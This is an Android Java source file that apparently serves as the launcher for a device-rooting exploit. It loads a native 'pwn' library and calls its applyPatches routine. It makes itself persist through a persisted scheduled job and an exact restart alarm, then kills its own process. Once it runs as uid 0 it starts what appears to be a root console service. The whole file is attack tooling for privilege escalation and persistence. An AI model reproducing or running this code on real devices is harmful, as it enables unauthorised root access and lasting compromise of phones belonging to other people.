package com.pwn.probe;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Process;
import java.io.FileOutputStream;

public class Main extends Activity {
    static { System.loadLibrary("pwn"); }
    public static native int applyPatches();

    static void log(String s) { android.util.Log.i("PWNROOT", s); }

    static void writeOut(String p, String d) {
        try { FileOutputStream f = new FileOutputStream(p); f.write(d.getBytes()); f.close(); } catch (Throwable t) { }
    }

    static void startConsole(Context c) {
        Intent i = new Intent(c, ConsoleService.class);
        try {
            if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(i); else c.startService(i);
        } catch (Throwable t) { log("startConsole err " + t); }
    }
    static void scheduleJob(Context c) {
        try {
            android.app.job.JobScheduler js = (android.app.job.JobScheduler) c.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            android.content.ComponentName cn = new android.content.ComponentName(c, BootJobService.class);
            android.app.job.JobInfo job = new android.app.job.JobInfo.Builder(1, cn)
                    .setPersisted(true)
                    .setMinimumLatency(1500)
                    .build();
            int r = js.schedule(job);
            log("scheduleJob=" + r);
        } catch (Throwable t) { log("scheduleJob err " + t); }
    }
    static void scheduleRestart(Context c) {
        try {
            AlarmManager am = (AlarmManager) c.getSystemService(Context.ALARM_SERVICE);
            Intent i = new Intent(c, BootReceiver.class);
            i.setAction("com.pwn.probe.RESTART");
            PendingIntent pi = PendingIntent.getBroadcast(c, 0, i, PendingIntent.FLAG_UPDATE_CURRENT);
            am.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, pi);
        } catch (Throwable t) { log("alarm err " + t); }
    }

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        int uid = Process.myUid();
        log("Main uid=" + uid);
        if (uid == 0) {
            writeOut("/sdcard/pwn_state.txt", "Main uid=0 console start\n");
            startConsole(this);
        } else {
            scheduleJob(this);
            int r = applyPatches();
            log("applyPatches=" + r);
            writeOut("/sdcard/pwn_state.txt", "Main uid=" + uid + " applyPatches=" + r + "\n");
            scheduleRestart(this);
            Process.killProcess(Process.myPid());
        }
        finish();
    }
}


